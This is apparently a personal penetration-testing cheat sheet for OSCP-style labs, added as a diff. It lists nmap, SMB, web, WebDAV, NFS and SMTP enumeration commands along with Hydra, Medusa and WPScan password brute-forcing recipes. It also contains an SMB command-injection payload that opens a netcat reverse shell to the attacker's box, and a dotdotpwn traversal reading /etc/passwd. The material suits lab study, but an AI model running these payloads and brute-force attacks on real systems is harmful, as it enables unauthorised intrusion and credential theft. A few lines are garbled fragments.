@@ -1,0 +1,191 @@
+Step1 => Port and service enumeration with nmap:
+
+Quick:
+
+nmap --top-ports 20 --open
+
+nmap -A -O 10.11
+
+netcat -v -z -n -w 1 X.X.X.X 1-1023
+
+For SSH:
+
+nmap 10.X.X.X -p 22 -sV --script=ssh-hostkey
+check SSH bad keys
+
+Hydra
+(on priv-esc only bruteforce users with etc/passwd file ends with /bin/bash)
+
+Extensive:
+
+nmap -sS -A -sV -O -p-  --script=default,vuln  
+nmap -A -sV -sU --script=default,vuln
+
+After intial enumeration:
+
+nmap --script=""  --script-timeout=1000
+
+
+Step2 => MYSQL/MSSQL (Nmap --script)
+	• For MYSQL
+ nmap -p 3306 --script mysql-enum.nse 10.11.1.X
+ mysql -u root -p password -h 10.11.1.X
+
+Step3 => SMB
+
+	• Nmap vuln scripts
+	• smbclient -L
+	• Enum4linux -a 10.11.1.X
+	• Metasploit auxiliary scanners
+
+Connect to null share:
+
+smbclient //10.10.10.3/tmp
+get shell :
+
+logon "/=`nc 'attack box ip' 4444 -e /bin/bash`"
+
+https://medium.com/@mjrmontemayor/htb-walkthrough-lame-a41f923593e6
+
+Also check for combination with smbclient Put and LFI to get a shell.
+
+SMB Bruteforce:
+
+hydra -l user -P /usr/share/wordlists/metasploit/common_roots.txt 10.11.X.X smb
+
+Step4 => Web
+
+=> the labs are designed so you should not be brute forcing anything for more than 30 minutes.
+
+Robots:
+parsero -u http://10.11.1.X
+or just curl -x -v /robots.txt
+
+
+Web Enumeration:
+	• nmap --script http-enum 192.168.10.55  
+	• Search for text and comments:
+curl 10.11.X.X -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+curl 10.11.X.X -s -L | html2text -width '99' | uniq
+
+nmap 10.11.1.71 -p 80 \
+  --script=http-shellshock \
+  --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi
+Pay attention to script args
+
+Nikto
+nikto -h -port 80 10.11.X.X
+
+whatweb -v -a 3 10.11.1.X
+
+wfuzz
+
+wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c --hc 404 https://10.11.1.35/FUZZ
+
+wfuzz with  hide pages with 0 lines:
+wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -c --hc 404 --hl 0 https://10.11.1.35/https://10.11.1.35/section.php?page=FUZZ 
+
+Dirb
+dirb http://10.11.1.229 /usr/share/dirb/wordlists/vulns/iis.txt -w
+
+Gobuster:
+
+	• Apache -CGI:
+ gobuster -u http://10.11.1.71/ \  -w /usr/share/seclists/Discovery/Web_Content/cgis.txt \ -s '200,204,403,500' -e
+
+	• Common:
+gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.11.1.223/ -fw -s 200,204,301,302,307,403,401 
+
+Dirsearch (amazing tool : https://github.com/maurosoria/dirsearch)
+python3 ~/tools/brute-force/dirsearch/dirsearch.py -u http://X.X.X.X
+
+Cewl: wordlist to be used as dictionnaries
+
+cewl http://10.11.X.X -m 4 -e -o -a -w bigtree-cewl.txt
+
+
+To test:
+
+Patator : password fuzzer rather than bruteforcer
+Webscarab
+
+LFI:
+
+dotdotpwn
+
+List load balancers:
+
+halberd 10.11.1.X -v
+lbd example.com
+
+
+
+Bruteforce passwords:
+
+=>httaccess protected directories:
+
+medusa -h 10.11.1.X -u admin -P /root/buffer/rockyou.txt -M http -m DIR:/xampp -T 10 
+http://www.foo
+
+Hydra
+
+Bruteforce passwords:
+ hydra -L seclists/Usernames/top-usernames-shortlist.txt -P buffer/rockyou.txt 10.11.1.X mysql -e nsr
+
+Hydra HTTP POST:
+
+hydra -l admin -P seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt 10.11.1.X -s 8000 http-post-form "/admin:password=^PASS^&send=%2Fadmin%2Fsite:invalid password.×" -V  -I 
+
+include -S for SSL
+ker
+Hyda enumerate users:
+
+hydra -L /root/Desktop/oscp-users -P /root/bigtree-cewl.txt  10.11.1.X  http-post-form "/site/index.php/admin/login/forgot-password:email=^USER^@^PASS^:You've entered an invalid email address." -V -T 64 -t 16 -I
+
+Xhydra (graphical interface)
+
+Hydra HTTP GET / DIGEST:
+
+hydra -l bethany -P seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt 10.11.1.X http-get /~login -e ns -s 9505 -V
+
+WPSCAN for wordpress password bruteforcing:
+
+wpscan --url http://10.11.1.X --wordlist /root/seclists/Passwords/Common-Credentials/best1050.txt --threads 50 --username admin
+
+
+Look for webdav:
+
+use auxiliary/scanner/http/webdav_scanner
+Nmap --script "webdav"
+
+Interact with webdav:
+
+davtest
+cadaver
+default pass for xampp: wampp/xampp
+
+Directory traversal:
+
+dotdotpwn -u http://10.11.1.X:443/section.php?page=TRAVERSAL -m http-url -x 443 -t 300 -f /etc/passwd -s -q -k timeout
+
+Look for mounts:
+
+showmount -e IP
+nmap -sV --script=nfs-showmount  IP
+
+Step6 => SMTP
+
+SMTP enum:
+smtp-user-enum -M VRFY -D acme.local -U /root/Desktop/oscp-users -t 10.11.1.115
+
+smtp-user-enum -M VRFY -U /root/seclists/oscp-users.txt -t 10.3.3.47 
+
+ismtp -h 10.3.3.47:25 -e /root/seclists/oscp-users.txt
+
+Automation:
+
+SPARTA
+Reconnoitre
+Faraday
+
+
